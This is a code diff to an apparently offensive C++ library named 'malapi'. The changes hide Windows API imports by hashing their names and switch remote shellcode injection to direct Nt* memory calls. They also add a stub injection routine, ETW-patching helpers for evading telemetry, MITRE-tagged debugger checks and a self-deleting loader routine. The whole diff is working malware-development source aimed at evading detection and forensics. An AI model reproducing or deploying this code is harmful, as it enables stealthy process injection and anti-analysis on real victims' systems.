@@ -316,6 +316,108 @@ namespace malapi
 		return (attribs != INVALID_FILE_ATTRIBUTES) && !(attribs & FILE_ATTRIBUTE_DIRECTORY);
 	}
 
+	//
+	// Uses GetProcessImageFileName to get the file path from a Process Handle
+	//
+	LPSTR GetFilePathA(void)
+	{
+		LPSTR file_path = (LPSTR)HeapAlloc(MAX_PATH * sizeof(CHAR));
+		DWORD file_size = 0;
+
+		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		const ULONG hash_getmodulefilenamea = HashStringFowlerNollVoVariant1a("GetModuleFileNameA");
+		const ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
+
+		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
+		if (!kernel32) return NULL;
+
+		typeGetLastError GetLastError = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
+		typeGetModuleFileNameA GetModuleFileNameA = (typeGetModuleFileNameA)GetProcAddressC(kernel32, hash_getmodulefilenamea);
+
+		file_size = GetModuleFileNameA(NULL, file_path, MAX_PATH);
+		if (!file_size)
+		{
+			LOG_ERROR("Unable to get File Path. (Code: %016llX)", GetLastError());
+			HeapFree(file_path);
+			return NULL;
+		}
+
+		LOG_INFO("File Path: %s", file_path);
+		return file_path;
+	}
+
+	LPWSTR GetFilePathW(void)
+	{
+		LPWSTR file_path = (LPWSTR)HeapAlloc(MAX_PATH * sizeof(WCHAR));
+		DWORD file_size = 0;
+
+		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		const ULONG hash_getmodulefilenamew = HashStringFowlerNollVoVariant1a("GetModuleFileNameW");
+		const ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
+
+		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
+		if (!kernel32) return NULL;
+
+		typeGetLastError GetLastError = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
+		typeGetModuleFileNameW GetModuleFileNameW = (typeGetModuleFileNameW)GetProcAddressC(kernel32, hash_getmodulefilenamew);
+
+		file_size = GetModuleFileNameW(NULL, file_path, MAX_PATH);
+		if (!file_size)
+		{
+			LOG_ERROR("Unable to get File Path. (Code: %016llX)", GetLastError());
+			HeapFree(file_path);
+			return NULL;
+		}
+
+		LOG_INFO("File Path: %ls", file_path);
+		return file_path;
+	}
+
+	//
+	// Deletes a file using the full file path
+	//
+	BOOL DeleteFileA(LPCSTR file_path)
+	{
+		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		const ULONG hash_deletefilea = HashStringFowlerNollVoVariant1a("DeleteFileA");
+		const ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
+
+		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
+
+		typeDeleteFileA DeleteFileA = (typeDeleteFileA)GetProcAddressC(kernel32, hash_deletefilea);
+		typeGetLastError GetLastError = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
+
+		BOOL success = DeleteFileA(file_path);
+		if (!success)
+		{
+			LOG_ERROR("Unable to delete file. (Code: %016llX)", GetLastError());
+			return success;
+		}
+		LOG_SUCCESS("Successfully deleted file!");
+		return success;
+	}
+
+	BOOL DeleteFileW(LPCWSTR file_path)
+	{
+		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		const ULONG hash_deletefilew = HashStringFowlerNollVoVariant1a("DeleteFileW");
+		const ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
+
+		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
+
+		typeDeleteFileW DeleteFileW = (typeDeleteFileW)GetProcAddressC(kernel32, hash_deletefilew);
+		typeGetLastError GetLastError = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
+
+		BOOL success = DeleteFileW(file_path);
+		if (!success)
+		{
+			LOG_ERROR("Unable to delete file. (Code: %016llX)", GetLastError());
+			return success;
+		}
+		LOG_SUCCESS("Successfully deleted file!");
+		return success;
+	}
+
 	///////////////////////
    //                   //
   //      Staging      //
@@ -547,22 +649,28 @@ namespace malapi
 	// Create Suspended Process
 	// Return Process Handle & Thread Handle
 	//
-	HANDLE CreateSuspendedProcess(_In_ LPSTR file_path, _Out_ HANDLE* process_handle, _Out_ HANDLE* thread_handle)
+	BOOL CreateSuspendedProcess(_In_ LPSTR file_path, _Out_ HANDLE* process_handle, _Out_ HANDLE* thread_handle)
 	{
+		BOOL success = FALSE;
 		STARTUPINFOA si = {};
 		PROCESS_INFORMATION pi = {};
+		HANDLE proc_handle = INVALID_HANDLE_VALUE;
 		*process_handle = INVALID_HANDLE_VALUE;
 		*thread_handle = INVALID_HANDLE_VALUE;
 
 #pragma region winapi_imports
 
 		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
+		constexpr DWORD hash_ntcreateuserprocess = HashStringFowlerNollVoVariant1a("NtCreateUserProcess");
 		constexpr DWORD hash_createprocessa = HashStringFowlerNollVoVariant1a("CreateProcessA");
 
 		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
+		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
 		if (!kernel32) return NULL;
 
-		typeCreateProcessA CreateProcessA = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
+		typeNtCreateUserProcess NtCreateUserProcess = (typeNtCreateUserProcess)GetProcAddressC(kernel32, hash_ntcreateuserprocess);
+		typeCreateProcessA CreateProcessC = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
 
 #pragma endregion
 
@@ -571,16 +679,18 @@ namespace malapi
 
 		si.cb = sizeof(STARTUPINFOA);
 
-		BOOL success = CreateProcessA(NULL, file_path, 0, 0, 0, (CREATE_NO_WINDOW | CREATE_SUSPENDED), 0, 0, &si, &pi);
-
-		if (!success) return NULL;
+		//success = NtCreateUserProcess(&pi.hProcess, &pi.hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, NULL, NULL);
+		success = CreateProcessC(0, file_path, 0, 0, 0, (CREATE_NO_WINDOW | CREATE_SUSPENDED), 0, 0, &si, &pi);
+		if (!success) return success;
 
 		*process_handle = pi.hProcess;
 		*thread_handle = pi.hThread;
+
+		return success;
 	}
 
 	//
-	// CreateSuspendedProcess
+	// CreateSuspendedProcess and Get Entry Point
 	// Return ThreadHandle
 	//
 	// Based on ired.team & https://bohops.com/2023/06/09/no-alloc-no-problem-leveraging-program-entry-points-for-process-injection/
@@ -793,44 +903,39 @@ namespace malapi
 		HMODULE ntdll = NULL;
 		DWORD old_protection = 0;
 
-		typeVirtualAllocExNuma VirtualAllocExNumaC = NULL;
-		typeVirtualProtectEx VirtualProtectExC = NULL;
-		typeWriteProcessMemory WriteProcessMemoryC = NULL;
-		typeGetLastError GetLastErrorC = NULL;
-
 		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
-		constexpr ULONG hash_virtualallocexnuma = HashStringFowlerNollVoVariant1a("VirtualAllocExNuma");
-		constexpr ULONG hash_virtualprotectex = HashStringFowlerNollVoVariant1a("VirtualProtectEx");
-		constexpr ULONG hash_writeprocessmemory = HashStringFowlerNollVoVariant1a("WriteProcessMemory");
-		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
 		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
+		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
+		constexpr ULONG hash_ntallocatevirtualmemory = HashStringFowlerNollVoVariant1a("NtAllocateVirtualMemory");
+		constexpr ULONG hash_ntprotectvirtualmemory = HashStringFowlerNollVoVariant1a("NtProtectVirtualMemory");
+		constexpr ULONG hash_ntwritevirtualmemory = HashStringFowlerNollVoVariant1a("NtWriteVirtualMemory");
+		constexpr ULONG hash_ntcreatethreadex = HashStringFowlerNollVoVariant1a("NtCreateThreadEx");
 
 		kernel32 = GetModuleHandleC(hash_kernel32);
 		ntdll = malapi::GetModuleHandleC(hash_ntdll);
-		if (!kernel32 || !ntdll) return NULL;
+		if (!kernel32 || !ntdll) return FALSE;
 
-		VirtualAllocExNumaC = (typeVirtualAllocExNuma)GetProcAddressC(kernel32, hash_virtualallocexnuma);
-		VirtualProtectExC = (typeVirtualProtectEx)GetProcAddressC(kernel32, hash_virtualprotectex);
-		WriteProcessMemoryC = (typeWriteProcessMemory)GetProcAddressC(kernel32, hash_writeprocessmemory);
-		GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
+		typeGetLastError GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
+		typeNtAllocateVirtualMemory NtAllocateVirtualMemory = (typeNtAllocateVirtualMemory)GetProcAddressC(ntdll, hash_ntallocatevirtualmemory);
+		typeNtProtectVirtualMemory NtProtectVirtualMemory = (typeNtProtectVirtualMemory)GetProcAddressC(ntdll, hash_ntprotectvirtualmemory);
+		typeNtWriteVirtualMemory NtWriteVirtualMemory = (typeNtWriteVirtualMemory)GetProcAddressC(ntdll, hash_ntwritevirtualmemory);
+		typeNtCreateThreadEx NtCreateThreadEx = (typeNtCreateThreadEx)GetProcAddressC(ntdll, hash_ntcreatethreadex);
 
-		address_ptr = VirtualAllocExNumaC(process_handle, NULL, shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE, 0);
-		if (address_ptr == NULL)
+		if (!NT_SUCCESS(NtAllocateVirtualMemory(process_handle, &address_ptr, 0, &shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)))
 		{
 			LOG_ERROR("Failed to allocate memory space (Code: %016llx)", GetLastErrorC());
 			return NULL;
 		}
 		else LOG_SUCCESS("Address Pointer: %016llx", address_ptr);
 
-		success = WriteProcessMemoryC(process_handle, address_ptr, shellcode, shellcode_size, &bytes_written);
-		if (!success)
+		if (!NT_SUCCESS(NtWriteVirtualMemory(process_handle, address_ptr, shellcode, shellcode_size, &bytes_written)))
 		{
 			LOG_ERROR("Error writing shellcode to memory (Code: %016llx)", GetLastErrorC());
 			return FALSE;
 		}
 		else LOG_SUCCESS("Shellcode written to memory.");
 
-		if (!VirtualProtectExC(process_handle, address_ptr, shellcode_size, PAGE_EXECUTE_READ, &old_protection))
+		if (!NT_SUCCESS(NtProtectVirtualMemory(process_handle, &address_ptr, &shellcode_size, PAGE_EXECUTE_READ, &old_protection)))
 		{
 			LOG_ERROR("Failed to change protection type (Code: %016llx)", GetLastErrorC());
 			return FALSE;
@@ -1421,6 +1526,19 @@ namespace malapi
 		return success;
 	}
 
+	BOOL InjectionCaroKann(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
+	{
+		// Encrypt Shellcode
+		// Allocate Memory for Encrypted Shellcode
+		// Allocate Memory for Decryptor?? <-- Must be a shellcode :woe:
+		// Create Execution Method for Shellcode(s)
+		// Decrypt Shellcode during Runtime using the decryptor shellcode
+		// Execute using Alternative Event Alert (SetWindowsHookEx)
+
+		WriteShellcodeMemory(process_handle, shellcode, shellcode_size);
+		return TRUE;
+	}
+
 	///////////////////////
    //                   //
   //      Evasion      //
@@ -1460,14 +1578,13 @@ namespace malapi
 
 	void PatchFunction(FARPROC function)
 	{
-		HMODULE kernel32 = NULL;
 		DWORD old_protection = 0;
 
 		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
 		constexpr ULONG hash_virtualprotectex = HashStringFowlerNollVoVariant1a("VirtualProtectEx");
 
-		kernel32 = GetModuleHandleC(hash_kernel32);
-		if (kernel32 == NULL) return;
+		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
+		if (!kernel32) return;
 		typeVirtualProtectEx VirtualProtectEx = (typeVirtualProtectEx)GetProcAddressC(kernel32, hash_virtualprotectex);
 
 		if (!VirtualProtectEx(0, function, 1, PAGE_EXECUTE_READWRITE, &old_protection)) return;
@@ -1512,7 +1629,7 @@ namespace malapi
 	// Patch ETW
 	// https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c
 	//
-	BOOL PatchEtwSsn(void)
+	BOOL PatchEtwNtTraceEvent(void)
 	{
 		BOOL success = FALSE;
 		HMODULE ntdll = NULL;
@@ -1537,18 +1654,19 @@ namespace malapi
 		return success;
 	}
 
+#define x64_ret		0xc3
+#define x64_rax		0x33
+#define x64_mov		0xb8
+#define x64_stub	0x20
+#define x64_xor		0x48
+#define MAX_SEARCH_INDEX 0xFF
+
 	//
 	// Patch ETW via EtwEventWrite/EtwEventWriteFull
 	// https://gist.github.com/wizardy0ga/7cadcc7484092ff25a218615005405b7
 	//
 	BOOL PatchEtwEventWrite(void)
 	{
-#define x64_ret		0xc3
-#define x64_mov		0xb8
-#define x64_stub	0x20
-#define x64_xor		0x48
-#define MAX_SEARCH_INDEX 0xFF
-
 		BOOL success = FALSE;
 		HMODULE kernel32 = NULL;
 		HMODULE ntdll = NULL;
@@ -1711,8 +1829,9 @@ namespace malapi
 		if (!kernel32) return FALSE;
 
 		typeIsDebuggerPresent IsDebuggerPresent = (typeIsDebuggerPresent)GetProcAddressC(kernel32, hash_isdebuggerpresent);
-		success = IsDebuggerPresent();
 
+		LOG_INFO("[T1622] Checking for Debugger Presence");
+		success = IsDebuggerPresent();
 		if (success)
 		{
 			LOG_INFO("Process Currently being Debugged.");
@@ -1745,15 +1864,95 @@ namespace malapi
 			return debugger_present;
 		}
 
+		LOG_INFO("[T1622] Checking for Debugger Presence");
 		return debugger_present;
 	}
 
-	//
-	// T1070.004
-	// Delete Loader if Debugger Present
-	//
-	VOID SelfDeleteLoader()
+	VOID SelfDeleteLoader(void)
 	{
+		LOG_INFO("[T1070.004] Attempting to Delete Loader");
+
+		const LPCWSTR original_file = L"able_del.exe";
+		const LPCWSTR sacrificial_file = L"able_tmp.exe";
+
+		SECURITY_ATTRIBUTES sa = { 0 };
+		STARTUPINFO si = { 0 };
+		PROCESS_INFORMATION pi = { 0 };
+
+		ZeroMemoryEx(&sa, sizeof(sa));
+		ZeroMemoryEx(&si, sizeof(si));
+		ZeroMemoryEx(&pi, sizeof(pi));
+
+		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		const ULONG hash_exitprocess = HashStringFowlerNollVoVariant1a("ExitProcess");
+		const ULONG hash_unmapviewoffile = HashStringFowlerNollVoVariant1a("UnmapViewOfFile");
+		const ULONG hash_createprocessa = HashStringFowlerNollVoVariant1a("CreateProcessA");
+
+#if UNICODE
+		const ULONG hash_createprocessw = HashStringFowlerNollVoVariant1a("CreateProcessW");
+		const ULONG hash_createfilew = HashStringFowlerNollVoVariant1a("CreateFileW");
+		const ULONG hash_movefilew = HashStringFowlerNollVoVariant1a("MoveFileW");
+		const ULONG hash_copyfilew = HashStringFowlerNollVoVariant1a("CopyFileW");
+#else
+		const ULONG hash_createfilea = HashStringFowlerNollVoVariant1a("CreateFileA");
+		const ULONG hash_movefilea = HashStringFowlerNollVoVariant1a("MoveFileA");
+		const ULONG hash_copyfilea = HashStringFowlerNollVoVariant1a("CopyFileA");
+#endif
+
+		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
+		if (!kernel32) return;
+
+		typeExitProcess ExitProcess = (typeExitProcess)GetProcAddressC(kernel32, hash_exitprocess);
+		typeUnmapViewOfFile UnmapViewOfFile = (typeUnmapViewOfFile)GetProcAddressC(kernel32, hash_unmapviewoffile);
+
+#if UNICODE
+		typeCreateFileW CreateFileW = (typeCreateFileW)GetProcAddressC(kernel32, hash_createfilew);
+		typeCreateProcessW CreateProcessW = (typeCreateProcessW)GetProcAddressC(kernel32, hash_createprocessw);
+		typeCopyFileW CopyFile = (typeCopyFileW)GetProcAddressC(kernel32, hash_copyfilew);
+		typeMoveFileW MoveFile = (typeMoveFileW)GetProcAddressC(kernel32, hash_movefilew);
+		LPWSTR file_path = NULL;
+#define CreateFile CreateFileW
+#define CopyFile CopyFileW
+#define MoveFile MoveFileW
+#define CreateProcess CreateProcessW
+#else
+		typeCopyFileA CopyFile = (typeCopyFileA)GetProcAddressC(kernel32, hash_copyfilea);
+		typeCreateProcessA CreateProcessA = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
+		typeMoveFileA MoveFile = (typeMoveFileA)GetProcAddressC(kernel32, hash_movefilea);
+		typeCreateFileA CreateFileA = (typeCreateFileA)GetProcAddressC(kernel32, hash_createfilea);
+		LPSTR file_path = NULL;
+#define CreateFile CreateFileA
+#define CreateProcess CreateProcessA
+#define CopyFile CopyFileA
+#define MoveFile MoveFileA
+#endif
+		file_path = GetFilePathW();
+
+		if (!CopyFile(file_path, sacrificial_file, FALSE))
+		{
+			LOG_ERROR("Failed to copy file.");
+			return;
+		}
+
+		HANDLE hFile = CreateFile(sacrificial_file, 0, FILE_SHARE_READ, &sa, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
+		if (hFile == INVALID_HANDLE_VALUE)
+		{
+			LOG_ERROR("Failed to create file handle.");
+			return;
+		}
+
+		if (!CreateProcess(NULL, (LPWSTR)file_path, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
+		{
+			LOG_ERROR("Failed to create process.");
+			return;
+		}
+
+		while (!DeleteFile(sacrificial_file));
+
+		LOG_SUCCESS("Deleting Loader");
+
+		ExitProcess(0);
+		return;
 	}
 
 	///////////////////////
